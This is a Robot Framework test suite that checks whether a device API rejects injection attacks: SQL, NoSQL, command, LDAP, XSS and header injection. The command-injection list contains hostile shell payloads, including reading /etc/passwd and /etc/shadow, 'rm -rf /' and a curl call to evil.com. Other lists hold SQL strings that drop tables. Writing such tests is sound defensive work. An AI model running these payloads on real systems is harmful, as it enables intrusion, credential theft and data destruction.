*** Settings ***
Library    Collections
Library    RequestsLibrary
Library    ../../../libraries/SecurityTestLibrary.py
Resource    ../../../resources/common.resource
Resource    ../../../resources/api_keywords.resource
Resource    ../../../resources/auth_keywords.resource

Suite Setup    Create Admin Session
Suite Teardown    Cleanup Injection Test Devices

*** Variables ***
@{INJECTION_DEVICE_IDS}      ${EMPTY}

*** Keywords ***
Cleanup Injection Test Devices
    ${headers}    Create Admin Session
    FOR    ${dev_id}    IN    @{INJECTION_DEVICE_IDS}
        Run Keyword And Ignore Error    Delete Device    ${dev_id}    ${headers}    expected_status=204
    END

Safe Create Device
    [Arguments]    ${device_data}    ${expected_status}=201
    ${headers}    Create Admin Session
    ${response}    Create Device    ${device_data}    ${headers}    ${expected_status}
    IF    ${expected_status} == 201
        ${device_id}    Get From Dictionary    ${response.json()}    id
        Append To List    ${INJECTION_DEVICE_IDS}    ${device_id}
    END
    RETURN    ${response}

*** Test Cases ***
Sql Injection In Device Serial Number Field
    [Documentation]    Verify SQL injection in serial_number field is properly sanitized
    [Tags]    owasp    A03    injection    sql-injection    security
    ${sql_payloads}    Generate Sql Injection Payloads
    ${headers}    Create Admin Session
    FOR    ${payload}    IN    @{sql_payloads}
        ${device_data}    Create Dictionary
        ...    serial_number=${payload}
        ...    device_type=matter_controller
        ...    manufacturer=InjectionTest
        ...    model=SQLI-Test
        ...    firmware_version=1.0.0
        ${response}    Create Device    ${device_data}    ${headers}    expected_status=400
        ${json}    Set Variable    ${response.json()}
        Dictionary Should Contain Key    ${json}    error
    END

Sql Injection In Device Id Parameter
    [Documentation]    Verify SQL injection in path parameter is sanitized
    [Tags]    owasp    A03    injection    sql-injection    security
    ${headers}    Create Admin Session
    ${sql_ids}    Create List
    ...    1 OR 1=1
    ...    1; DROP TABLE devices
    ...    1 UNION SELECT * FROM users
    ...    1' OR '1'='1
    ...    1" OR "1"="1
    ...    1` OR 1=1 --
    FOR    ${sql_id}    IN    @{sql_ids}
        ${response}    GET
        ...    ${BASE_URL}${API_VERSION}/devices/${sql_id}
        ...    headers=${headers}
        ...    expected_status=404
        Log    SQL injection ID ${sql_id} correctly returned 404
    END

NoSql Injection Attempts
    [Documentation]    Verify NoSQL injection payloads are rejected
    [Tags]    owasp    A03    injection    nosql-injection    security
    ${headers}    Create Admin Session
    ${nosql_payloads}    Create List
    ...    {"$ne": null}
    ...    {"$gt": ""}
    ...    {"$regex": ".*"}
    ...    {"$where": "1==1"}
    ...    admin' || 'a'=='a
    FOR    ${payload}    IN    @{nosql_payloads}
        ${device_data}    Create Dictionary
        ...    serial_number=NOSQL-TEST-${RANDOM}
        ...    device_type=matter_controller
        ...    manufacturer=NoSQLTest
        ...    model=Test
        ...    firmware_version=1.0.0
        ...    extra_field=${payload}
        ${response}    Create Device    ${device_data}    ${headers}    expected_status=400
        Log    NoSQL payload rejected correctly: ${payload}
    END

Command Injection In Device Name Field
    [Documentation]    Verify command injection in device name is sanitized
    [Tags]    owasp    A03    injection    command-injection    security
    ${headers}    Create Admin Session
    ${cmd_payloads}    Create List
    ...    ; ls -la
    ...    | cat /etc/passwd
    ...    `whoami`
    ...    $(cat /etc/shadow)
    ...    && rm -rf /
    ...    || curl evil.com
    ...    ; ping -c 10 127.0.0.1
    FOR    ${payload}    IN    @{cmd_payloads}
        ${serial}    Generate Unique Device Serial
        ${device_data}    Create Dictionary
        ...    serial_number=${serial}
        ...    device_type=matter_controller
        ...    manufacturer=CmdInjection
        ...    model=Test
        ...    firmware_version=1.0.0
        ...    device_name=${payload}
        ${response}    Create Device    ${device_data}    ${headers}    expected_status=400
        ${json}    Set Variable    ${response.json()}
        Dictionary Should Contain Key    ${json}    error
        Log    Command injection payload rejected: ${payload}
    END

Ldap Injection Attempts
    [Documentation]    Verify LDAP injection payloads are rejected
    [Tags]    owasp    A03    injection    ldap-injection    security
    ${headers}    Create Admin Session
    ${ldap_payloads}    Create List
    ...    *)(uid=*
    ...    |(uid=*)
    ...    admin*)(|(password=*
    ...    *)(|(password=*
    ...    admin)(cn=
    FOR    ${payload}    IN    @{ldap_payloads}
        ${serial}    Generate Unique Device Serial
        ${device_data}    Create Dictionary
        ...    serial_number=${serial}
        ...    device_type=matter_controller
        ...    manufacturer=LDAPTest
        ...    model=Test
        ...    firmware_version=1.0.0
        ...    device_name=${payload}
        ${response}    Create Device    ${device_data}    ${headers}    expected_status=400
        Log    LDAP injection payload rejected: ${payload}
    END

Xss Injection In Device Fields
    [Documentation]    Verify XSS payloads in device fields are sanitized
    [Tags]    owasp    A03    injection    xss    security
    ${headers}    Create Admin Session
    ${xss_payloads}    Generate Xss Payloads
    FOR    ${payload}    IN    @{xss_payloads}
        ${serial}    Generate Unique Device Serial
        ${device_data}    Create Dictionary
        ...    serial_number=${serial}
        ...    device_type=matter_controller
        ...    manufacturer=XssTest
        ...    model=${payload}
        ...    firmware_version=1.0.0
        ${response}    Create Device    ${device_data}    ${headers}    expected_status=201
        ${device_id}    Get From Dictionary    ${response.json()}    id
        Append To List    ${INJECTION_DEVICE_IDS}    ${device_id}
        ${get_resp}    Get Device    ${device_id}    ${headers}
        ${get_json}    Set Variable    ${get_resp.json()}
        Should Not Contain    ${get_json}[model]    <script
    END

Auth Endpoint Injection
    [Documentation]    Verify injection attacks on auth endpoints are mitigated
    [Tags]    owasp    A03    injection    auth    security
    ${sql_auth_payloads}    Generate Sql Injection Payloads
    FOR    ${payload}    IN    @{sql_auth_payloads}
        ${response}    Login    ${payload}    testpass    expected_status=401
        Log    SQL injection rejected on login: ${payload}
    END
    FOR    ${payload}    IN    @{sql_auth_payloads}
        ${body}    Create Dictionary    email=test@test.com    password=${payload}
        ${response}    POST
        ...    ${BASE_URL}${API_VERSION}/auth/login
        ...    json=${body}
        ...    expected_status=401
        Log    SQL injection in password rejected
    END

Header Injection Attempt
    [Documentation]    Verify header injection in custom headers is mitigated
    [Tags]    owasp    A03    injection    header-injection    security
    ${headers}    Create Admin Session
    Set To Dictionary    ${headers}    X-Custom-Injection    test\r\nX-Hacked: true
    ${response}    GET
    ...    ${BASE_URL}${API_VERSION}/health
    ...    headers=${headers}
    ...    expected_status=200
    Log    Header injection attempt did not crash server
